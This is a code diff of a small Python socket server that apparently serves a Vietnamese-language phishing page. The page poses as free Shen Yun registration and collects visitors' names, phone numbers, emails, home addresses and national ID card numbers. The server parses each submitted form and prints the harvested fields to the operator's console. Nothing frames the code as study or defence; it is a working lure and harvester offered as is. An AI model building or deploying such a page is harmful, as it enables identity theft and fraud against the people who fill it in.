@@ -1,6 +1,6 @@
 import socket
 import sys
-from flask import Flask, render_template, request
+import urllib.parse
 
 IP = '192.168.1.18'
 PORT = 443
@@ -23,13 +23,12 @@ def handler():
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>hello word</title>
-    <img src="https://cdn.tgdd.vn/Products/Images/42/114115/iphone-x-64gb-hh-600x600.jpg" width="200" height="200">
+    <img src="https://www.shenyunperformingarts.org/data/image/original/2022/01/12/950603cf46817ee4e320b2db79be5a71.jpg" width="200" height="200">
 </head>
 <body>
-    <h1>xin Chao</h1>
-    <h1>thiệp mời đám cưới</h1>
-    <p>đường Hoàng Liên</p>
-    <form action="/login" method="POST">
+    <h1>Đăng Ký Shen Yun Miễn Phí</h1>
+    <p>Vui Lòng Nhập Thông Tin Phía Dưới</p>
+    <form action="/dang-ky-shen-yun-mien-phi" method="POST">
         <label for="usr">Họ Tên: </label>
         <input type="text" id="name" name="name" required><br>
 
@@ -41,14 +40,17 @@ def handler():
         <body></body>
 
         <label for="mail">Email: </label>
-        <input type="text" name="emali" required><br>
+        <input type="text" id="email" name="email" required><br>
 
         <body></body>
 
         <label for="address">Địa Chỉ Nhà: </label>
         <input type="text" id="addr" name="addr" required><br>
 
-        <input type="submit" value="Send"> 
+        <label for="id_card">Số Chứng Minh: </label>
+        <input type="text" id="ttcn" name="ttcn" required><br>
+
+        <input type="submit" value="Gửi Thông Tin"> 
 
     </form>
 </body>
@@ -59,27 +61,32 @@ def handler():
 
 		print(f"[+] One REQUESTS From {handler_address}...")
 
-		app = Flask(__name__)
+		data = handler_connect.recv(1024).decode()
+		if 'POST /dang-ky-shen-yun-mien-phi' in data:
+			print('[+] form data spliting...')
+			data_lines = data.split("\r\n")
+			for line in data_lines:
+				if "name=" in line:
+					names = line.split("name=")[1].split("&")[0]
+					names = urllib.parse.unquote(names)
+					print(f"[-] Name: {names}")
+				if "sdt=" in line:
+					sdt = line.split("sdt=")[1].split("&")[0]
+					names = urllib.parse.unquote(sdt)
+					print(f"[-] Phone: {sdt}")
+				if "mail=" in line:
+					mail = line.split("mail=")[1].split("&")[0]
+					names = urllib.parse.unquote(mail)
+					print(f"[-] Email: {mail}")
+				if "addr=" in line:
+					addr = line.split("addr=")[1].split("&")[0]
+					names = urllib.parse.unquote(addr)
+					print(f"[-] Address: {addr}")
+				if "ttcn=" in line:
+					ttcn = line.split("ttcn=")[1].split("&")[0]
+					names = urllib.parse.unquote(ttcn)
+					print(f"[-] Card: {ttcn}")
+				
 
-		@app.route('/')
-		def home():
-			return render_template('index.html')
-
-		@app.route('/index', methods=['POST'])
-		def log():
-			usr = request.form('usr')
-			sdt = request.form('sdt')
-			mail = request.form('mail')
-			address = request.form('address')
-
-			print(f"[+] Username : {usr}")
-			print(f"[+] phone : {sdt}")
-			print(f"[+] Mail : {mail}")
-			print(f"[+] Address : {address}")
-
-			return "Logup Success"
-
-		if __name__ == "__main__":
-			app.run(host=f"{IP}", port=int(PORT))
-
+		handler_connect.close()
 handler()
